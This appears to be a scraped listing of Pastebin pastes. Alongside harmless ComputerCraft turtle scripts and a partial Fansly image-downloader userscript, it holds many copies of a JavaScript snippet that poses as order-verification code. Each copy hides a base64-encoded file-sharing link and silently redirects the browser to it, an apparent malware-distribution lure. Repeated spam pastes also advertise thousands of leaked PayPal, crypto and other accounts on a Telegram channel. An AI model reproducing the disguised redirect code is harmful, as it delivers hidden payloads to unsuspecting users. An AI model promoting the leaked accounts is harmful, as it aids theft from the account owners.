      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WJSdtLvV,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 06:02:06 PM CDT,41094 Accounts Posted On https://t.me/leakzbyeminem
NcPPMjSp,BoreThrough.lua,Ubidibity,Lua,Wednesday 30th of April 2025 05:53:40 PM CDT,"-- rewrite of borethrough (lost turtle)
-- generic tunnel through whatever until you hit air (with sand/gravel tolerance)

 while not turtle.forward() do
   turtle.digUp()
   turtle.dig()
   turtle.forward()
--  turtle.digDown()
  -- note it doesn't necessarily detect fluids
   turtle.placeDown() -- just so I have something to walk on if there's air below but not in front
 end
-- come back a bit in case it parks in lava
turtle.turnRight()
turtle.turnRight()
for x=1,16 do
  turtle.Forward()
end
"
Ppb7czuL,Market.js,kammex,JavaScript,Wednesday 30th of April 2025 05:46:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49511/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S6krKLqz,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 05:46:44 PM CDT,43126 Accounts Posted On https://t.me/leakzbyeminem
8cAJAG4D,stairsUP.lua,Ubidibity,Lua,Wednesday 30th of April 2025 05:41:43 PM CDT,"-- Rewrite of my usual stairsUp program
maxheight=64
x=0
do while not turtle.forward() and x~=maxheight
  turtle.placeDown()
  turtle.up()
  x=x+1
end"
xkbAUSBx,Untitled,kammex,JavaScript,Wednesday 30th of April 2025 05:31:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29649/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Zh08z4DP,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 05:31:22 PM CDT,27279 Accounts Posted On https://t.me/leakzbyeminem
ypw1WRQa,init.lua,Ubidibity,Lua,Wednesday 30th of April 2025 05:16:08 PM CDT,"-- Initialize turtle.
-- So, I lose a lot of turtles.  I drop them by mistake, send them off with programmatic errors that send them into oblivion
-- or I get distracted by an ore vein and can't find my way back to the turtle.
-- at any case each time what gets me the most is having to reacquire all my programs.
-- This init.lua program is intended to just pull all my 'usual' turtle programs, it's intended to be run once to create a
-- default turtle with the standard tools I like, such as goForward, goUp, goDown, boxmining, etc.
-- I'm incorporating the update program function so you can also re-run it to bulk update programs for older turtles


local function updateProgram(pastebinCode, programName)
  print(""Starting update process for "" .. programName .. ""..."")
  if fs.exists(programName) then
    print(""Deleting old version of "" .. programName .. ""..."")
    fs.delete(programName)
    if not fs.exists(programName) then
      print(""Old version deleted successfully."")
    else
      error(""Failed to delete old version of "" .. programName)
    end
  else
    print(""No old version of "" .. programName .. "" found."")
  end

  print(""Downloading new version from Pastebin..."")
  local success = shell.run(""pastebin"", ""get"", pastebinCode, programName)
  if success then
    print(""Successfully downloaded "" .. programName .. "" from Pastebin."")
    print(""Update complete! You can now run "" .. programName .. ""."")
  else
    error(""Failed to download "" .. programName .. "" from Pastebin. Check the Pastebin code or internet connection."")
  end
end

local programName = ""boxmining.lua""
local pastebinCode = ""9LGhh30Y""
updateProgram(pastebinCode, programName)

local programName = ""simp_tree.lua""
local pastebinCode = ""59cssnQ2""
updateProgram(pastebinCode, programName)

local programName = ""downramp.lua""
local pastebinCode = ""M5w7bYQ1""
updateProgram(pastebinCode, programName)

local programName = ""clayminer.lua""
local pastebinCode = ""6mKBdMvD""
updateProgram(pastebinCode, programName)

local programName = ""floor.lua""
local pastebinCode = ""BmpxvsU0""
updateProgram(pastebinCode, programName)

local programName = ""stairsUp.lua""
local pastebinCode = ""8cAJAG4D""
updateProgram(pastebinCode, programName)

local programName = ""borethrough.lua""
local pastebinCode = ""NcPPMjSp""
updateProgram(pastebinCode, programName)

"
2Y8trr1E,Products.js,kammex,JavaScript,Wednesday 30th of April 2025 05:16:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27587/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SyNStMw2,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 05:16:00 PM CDT,70735 Accounts Posted On https://t.me/leakzbyeminem
tY0XYDS6,Order.js,kammex,JavaScript,Wednesday 30th of April 2025 05:00:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87075/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
E0UrHDZk,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 05:00:39 PM CDT,30476 Accounts Posted On https://t.me/leakzbyeminem
AYzRnBgF,Market.js,kammex,JavaScript,Wednesday 30th of April 2025 04:45:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02790/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1m2PjWdP,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 04:45:16 PM CDT,02115 Accounts Posted On https://t.me/leakzbyeminem
bEdqYFvq,Untitled,kammex,JavaScript,Wednesday 30th of April 2025 04:29:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96452/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mBRfAEw2,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 04:29:54 PM CDT,39933 Accounts Posted On https://t.me/leakzbyeminem
xNYdeUXJ,Key,PurpleDragonUntitled,Lua,Wednesday 30th of April 2025 04:23:22 PM CDT,Key Is Dyanosaur
khywq2sb,Products.js,kammex,JavaScript,Wednesday 30th of April 2025 04:14:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61691/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rR40McJT,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 04:14:32 PM CDT,20278 Accounts Posted On https://t.me/leakzbyeminem
SE281CPw,Order.js,kammex,JavaScript,Wednesday 30th of April 2025 03:59:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42337/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gfcNPM7U,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 03:59:10 PM CDT,75424 Accounts Posted On https://t.me/leakzbyeminem
P0S1KFpX,Market.js,kammex,JavaScript,Wednesday 30th of April 2025 03:43:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42506/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EsLQRiw1,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 03:43:47 PM CDT,46206 Accounts Posted On https://t.me/leakzbyeminem
yvcqEDF7,Fansly images download,kkulczyk4,JavaScript,Wednesday 30th of April 2025 03:36:01 PM CDT,"(function() {
    // --- Configuration ---
    const scriptIdentifier = 'downloader-script'; // Unique identifier for elements created by this script
    const imageSelector = '.media-slider .selected-image img.image.contain-no-grow'; // Selector for images
    const nextButtonSelector = '.modal-next-button'; // Selector for the website's next button
    const prevButtonSelector = '.modal-prev-button'; // Selector for the website's previous button
    const closeWebsiteButtonSelector = '.modal-close-button'; // Selector for the website's close button
    const detectionDelay = 1000; // Increased milliseconds to wait after a click before checking for images
    const updateDelay = 700; // Milliseconds to wait after simulating navigation before rescanning
    const thumbnailWidth = '200px'; // Desired width for image thumbnails

    // --- Cleanup Previous Instances ---
    console.log(`Checking for and removing previous instances of '${scriptIdentifier}' script elements...`);
    const previousElements = document.querySelectorAll(`[data-${scriptIdentifier}=""true""]`);
    previousElements.forEach(el => {
        console.log(`Removing previous element:`, el);
        if (el.parentNode) {
            el.parentNode.removeChild(el);
        }
    });
    // Note: Removing previous global event listeners added anonymously is difficult.
    // This cleanup focuses on removing the DOM elements created by previous runs.
    // The logic below is designed to only operate with the *new* elements it creates.


    // --- Global variables ---
    let overlay = null; // Holds the main overlay element when active
    let imageGridContainer = null; // Holds the div for image thumbnails inside the overlay
    let statusIndicator = null; // Holds the persistent top-center status/button element
    let statusTextElement = null; // Holds the ""Downloader active"" text element
    let activateButtonElement = null; // Holds the ""Downloader"" button element

    // --- Function to simulate click on a website button ---
    function simulateWebsiteButtonClick(selector) {
         const targetButton = document.querySelector(selector);
         if (targetButton) {
             console.log(`Simulating click on website button: ${selector}`);
             targetButton.click(); // Trigger the website's event handler
             return true; // Indicate button was found and clicked
         } else {
             console.warn(`Website button not found: ${selector}.`);
             return false; // Indicate button was not found
         }
    }

    // --- Function to display temporary messages in the overlay ---
    function showOverlayMessage(messageText, color = 'yellow', duration = 3000) {
         if (!overlay) {
             console.error(""Overlay not initialized, cannot show message."");
             return;
         }

         // Remove any previous messages first within this overlay instance
         overlay.querySelectorAll('.overlay-message').forEach(msg => msg.remove());

         const messageElement = document.createElement('p');
         messageElement.innerText = messageText;
         messageElement.style.color = color;
         messageElement.style.marginTop = '10px';
         messageElement.style.padding = '10px';
         messageElement.style.backgroundColor = 'rgba(0,0,0,0.5)';
         messageElement.style.borderRadius = '5px';
         messageElement.style.textAlign = 'center';
         messageElement.classList.add('overlay-message'); // Add a class for easy selection/removal
         messageElement.style.zIndex = '10002'; // Ensure message is above image grid


         // Find a reference point below the close button and above the image grid
         // This makes the message appear consistently near the top
         const referenceElement = imageGridContainer || overlay.querySelector('button');
          if(referenceElement) {
               // Insert message before the reference element
               overlay.insertBefore(messageElement, referenceElement);
          } else {
              // Fallback: append to the overlay
              overlay.appendChild(messageElement);
          }


         // Remove the message after a duration
         setTimeout(() => {
             if(messageElement && messageElement.parentNode) {
                 messageElement.parentNode.removeChild(messageElement);
             }
         }, duration);
    }


    // --- Function to select images and update the overlay content ---
    function updateOverlayContent() {
        // Ensure the image grid container exists for the *current* overlay instance
        if (!imageGridContainer || !overlay || !document.body.contains(overlay)) {
             console.warn(""Overlay or image grid container not active/initialized. Cannot update content."");
             return;
        }

        // Clear previously loaded images and messages within the grid container
        imageGridContainer.innerHTML = '';
         // Also clear messages that might be outside the grid container but within overlay
         overlay.querySelectorAll('.overlay-message').forEach(msg => msg.remove());


        const images = document.querySelectorAll(imageSelector);

        if (images.length === 0) {
            showOverlayMessage('No images found on this gallery slide with the provided selector.', 'yellow', 5000);
            console.log('No images found with the provided selector on this slide.');
            return;
        }

        // Add new images and download buttons
        images.forEach((img, index) => {
            const thumbContainer = document.createElement('div');
            thumbContainer.style.margin = '10px';
            thumbContainer.style.border = '1px solid #ccc';
            thumbContainer.style.padding = '5px';
            thumbContainer.style.backgroundColor = '#fff';
            thumbContainer.style.display = 'flex';
            thumbContainer.style.flexDirection = 'column';
            thumbContainer.style.alignItems = 'center';
            thumbContainer.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
            thumbContainer.style.width = `calc(${thumbnailWidth} + 10px)`; // Container slightly wider than thumb + padding
            thumbContainer.style.flexShrink = '0'; // Prevent shrinking


            const thumb = document.createElement('img');
            thumb.src = img.src;
            thumb.style.width = thumbnailWidth; // Use the configured width
            thumb.style.height = 'auto'; // Maintain aspect ratio
            thumb.style.display = 'block';
            thumb.style.marginBottom = '10px';

            const downloadButton = document.createElement('a');
            downloadButton.href = img.src;

            // Attempt to create a filename from the URL
            const urlParts = img.src.split('/');
            let filename = urlParts.pop();
            if (!filename || filename.indexOf('.') === -1 || filename.startsWith('?')) { // Added check for query param only filename
                 filename = `image_${index + 1}.png`;
            } else {
                filename = filename.split('?')[0]; // Remove query parameters
            }
            downloadButton.download = filename;

            downloadButton.innerText = 'Download';
            downloadButton.style.display = 'block';
            downloadButton.style.width = '100%'; // Make button fill the container width
            downloadButton.style.padding = '5px 0'; // Adjust padding
            downloadButton.style.backgroundColor = '#007bff';
            downloadButton.style.color = '#fff';
            downloadButton.style.textDecoration = 'none';
            downloadButton.style.borderRadius = '5px';
            downloadButton.style.textAlign = 'center';
            downloadButton.style.cursor = 'pointer';
            downloadButton.style.transition = 'background-color 0.3s ease';

            downloadButton.onmouseover = function() { this.style.backgroundColor = '#0056b3'; };
            downloadButton.onmouseout = function() { this.style.backgroundColor = '#007bff'; };


            thumbContainer.appendChild(thumb);
            thumbContainer.appendChild(downloadButton);
            imageGridContainer.appendChild(thumbContainer);
        });
    }

     // --- Function to create and activate the downloader overlay ---
    function activateDownloaderOverlay() {
        // Check if overlay is already active by checking the global variable
        if (overlay !== null) {
            console.log(""Downloader overlay is already active."");
            return; // Don't create a new one if one exists
        }

        console.log(""Activating downloader overlay..."");

        // Create the main overlay element
        overlay = document.createElement('div');
        overlay.setAttribute(`data-${scriptIdentifier}`, 'true'); // Mark element for cleanup
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)'; // Semi-transparent black
        overlay.style.zIndex = '10000'; // Ensure it's on top
        overlay.style.overflowY = 'auto'; // Enable scrolling
        overlay.style.display = 'flex';
        overlay.style.flexDirection = 'column'; // Stack content vertically
        overlay.style.alignItems = 'center'; // Center items horizontally
        overlay.style.padding = '20px';
        overlay.style.boxSizing = 'border-box';
        overlay.style.color = '#fff'; // Default text color for messages

        // Add a Close button to the overlay
        const closeButton = document.createElement('button');
        closeButton.innerText = 'Close Gallery View';
        closeButton.style.position = 'absolute';
        closeButton.style.top = '10px';
        closeButton.style.right = '10px';
        closeButton.style.padding = '10px';
        closeButton.style.cursor = 'pointer';
        closeButton.style.zIndex = '10001'; // Ensure button is above other content
        closeButton.onclick = function() {
            // --- Action when overlay close button is clicked ---
            console.log(""Closing downloader overlay..."");

            // 1. Simulate click on the website's close button
            simulateWebsiteButtonClick(closeWebsiteButtonSelector);

            // 2. Remove this overlay from the DOM
            if (overlay && overlay.parentNode) {
               overlay.parentNode.removeChild(overlay);
            }

            // 3. Clean up global references
            overlay = null;
            imageGridContainer = null;
             console.log(""Overlay closed and references cleared."");

            // 4. Show the ""Downloader active"" status again
             showStatusText();
        };
        overlay.appendChild(closeButton);

        // Create container for the image grid
        imageGridContainer = document.createElement('div');
        imageGridContainer.style.display = 'flex';
        imageGridContainer.style.flexWrap = 'wrap';
        imageGridContainer.style.justifyContent = 'center';
        imageGridContainer.style.width = '100%';
        imageGridContainer.style.marginTop = '60px'; // Adjust spacing below close button
        imageGridContainer.style.marginBottom = '20px';
        overlay.appendChild(imageGridContainer);

        // Create container for navigation buttons
        const navButtonContainer = document.createElement('div');
        navButtonContainer.style.display = 'flex';
        navButtonContainer.style.gap = '20px';
        navButtonContainer.style.marginBottom = '20px';

        const prevButton = document.createElement('button');
        prevButton.innerText = 'Previous';
        prevButton.style.padding = '10px 20px';
        prevButton.style.cursor = 'pointer';
        prevButton.onclick = function() {
            const clicked = simulateWebsiteButtonClick(prevButtonSelector);
             if(clicked) {
                // Only update overlay if the website button was found and clicked
                setTimeout(updateOverlayContent, updateDelay);
             } else {
                // Optionally show a message in the overlay if nav button wasn't found
                showOverlayMessage(`Could not find website's Previous button: ${prevButtonSelector}`);
             }
        };
        navButtonContainer.appendChild(prevButton);

        const nextButton = document.createElement('button');
        nextButton.innerText = 'Next';
        nextButton.style.padding = '10px 20px';
        nextButton.style.cursor = 'pointer';
        nextButton.onclick = function() {
             const clicked = simulateWebsiteButtonClick(nextButtonSelector);
             if(clicked) {
                // Only update overlay if the website button was found and clicked
                setTimeout(updateOverlayContent, updateDelay);
             } else {
                // Optionally show a message in the overlay if nav button wasn't found
                showOverlayMessage(`Could not find website's Next button: ${nextButtonSelector}`);
             }
        };
        navButtonContainer.appendChild(nextButton);

        overlay.appendChild(navButtonContainer);

        // Add the overlay to the document body
        document.body.appendChild(overlay);

        // Populate the overlay with images from the current view immediately
        updateOverlayContent();
    }

    // --- Functions to manage the status indicator ---
    function setupStatusIndicator() {
        // Check if status indicator is already set up by checking the global variable
        if (statusIndicator !== null) {
            return; // Already set up
        }

        console.log(""Setting up status indicator."");

        statusIndicator = document.createElement('div');
        statusIndicator.setAttribute(`data-${scriptIdentifier}`, 'true'); // Mark element for cleanup
        statusIndicator.style.position = 'fixed';
        statusIndicator.style.top = '10px';
        statusIndicator.style.left = '50%';
        statusIndicator.style.transform = 'translateX(-50%)'; // Center horizontally
        statusIndicator.style.zIndex = '9999'; // Below the main overlay
        statusIndicator.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
        statusIndicator.style.color = '#fff';
        statusIndicator.style.padding = '8px 15px';
        statusIndicator.style.borderRadius = '5px';
        statusIndicator.style.fontSize = '14px';
        statusIndicator.style.display = 'flex'; // Use flex for internal elements
        statusIndicator.style.alignItems = 'center';
        statusIndicator.style.pointerEvents = 'none'; // Make the container non-interactive by default


        statusTextElement = document.createElement('span');
        statusTextElement.innerText = 'Downloader active';
         statusTextElement.style.pointerEvents = 'none'; // Text is not clickable
        statusIndicator.appendChild(statusTextElement);

        activateButtonElement = document.createElement('button');
        activateButtonElement.innerText = 'Downloader';
        activateButtonElement.style.display = 'none'; // Hidden initially
        activateButtonElement.style.marginLeft = '10px'; // Space between text and button
        activateButtonElement.style.padding = '5px 10px';
        activateButtonElement.style.cursor = 'pointer';
        activateButtonElement.style.pointerEvents = 'auto'; // Button is clickable
         activateButtonElement.onclick = function(event) {
              console.log(""Activate button clicked."");
              event.stopPropagation(); // Prevent the click from bubbling up
              hideStatusIndicatorElements(); // Hide status indicator elements
              activateDownloaderOverlay(); // Activate the overlay
         };
         statusIndicator.appendChild(activateButtonElement);

        document.body.appendChild(statusIndicator);

        // Initially show the ""active"" text
        showStatusText();
    }

    function showStatusText() {
         // Check if the current status indicator elements exist before trying to update
         if (statusTextElement && activateButtonElement && statusIndicator && document.body.contains(statusIndicator)) {
             statusTextElement.style.display = 'inline';
             activateButtonElement.style.display = 'none';
             statusIndicator.style.cursor = 'default'; // Not clickable when just text
             statusIndicator.style.pointerEvents = 'none'; // Make the entire indicator non-interactive
             statusIndicator.onclick = null; // Ensure no click listener is attached to the container
             console.log(""Showing status text."");
         } else {
             console.warn(""Status indicator elements not found, cannot show status text."");
         }
    }

    function showActivateButton() {
        // Only show button if overlay is not active and status indicator elements exist
        if (statusTextElement && activateButtonElement && statusIndicator && document.body.contains(statusIndicator) && overlay === null) {
            statusTextElement.style.display = 'none';
            activateButtonElement.style.display = 'inline-block';
            statusIndicator.style.cursor = 'pointer'; // Make the indicator clickable
            statusIndicator.style.pointerEvents = 'auto'; // Make the entire indicator interactive

             // Attach click listener to the indicator container to activate the overlay
             statusIndicator.onclick = function(event) {
                 console.log(""Status indicator (button state) clicked."");
                 event.stopPropagation(); // Prevent the click from bubbling
                 hideStatusIndicatorElements(); // Hide the indicator elements
                 activateDownloaderOverlay(); // Activate the overlay
                 statusIndicator.onclick = null; // Remove this specific click listener after use
             };

             // Note: The activateButtonElement also has its own click listener,
             // which provides a smaller clickable target within the indicator.
             // Both lead to the same activation logic.
             console.log(""Showing activate button."");

        } else {
            console.warn(""Status indicator elements not found or overlay is active, cannot show activate button."");
             // If elements are missing but overlay is not active, maybe set up indicator again?
             // Removed auto-setup logic here to keep it simpler and rely on user re-running script if needed.
             if (overlay !== null) {
                  console.log(""Overlay is active, not showing activate button."");
             }
        }
    }

    function hideStatusIndicatorElements() {
         // Check if the current status indicator elements exist before trying to update
         if (statusTextElement && activateButtonElement && statusIndicator && document.body.contains(statusIndicator)) {
            statusTextElement.style.display = 'none';
            activateButtonElement.style.display = 'none';
            statusIndicator.style.cursor = 'default';
            statusIndicator.style.pointerEvents = 'none'; // Make non-interactive
            statusIndicator.onclick = null; // Ensure click listener is removed
             console.log(""Hiding status indicator elements."");
         } else {
              console.warn(""Status indicator elements not found, cannot hide elements."");
         }
    }


    // --- Global Event Listener to detect gallery opening ---
    // This listener is added *once* when the script runs and persists.
    // Its logic checks for the presence of our *current* statusIndicator before acting.
    document.addEventListener('click', function(event) {
        // If our overlay is already active, do not try to detect a new gallery
        if (overlay !== null) {
            return;
        }

        // Only proceed if our status indicator element exists (means our script is running)
        if (statusIndicator === null || !document.body.contains(statusIndicator)) {
             console.log(""Click detected, but status indicator not found. Script may not be fully initialized or its elements were removed manually."");
             return; // Don't run detection logic if indicator is gone
        }

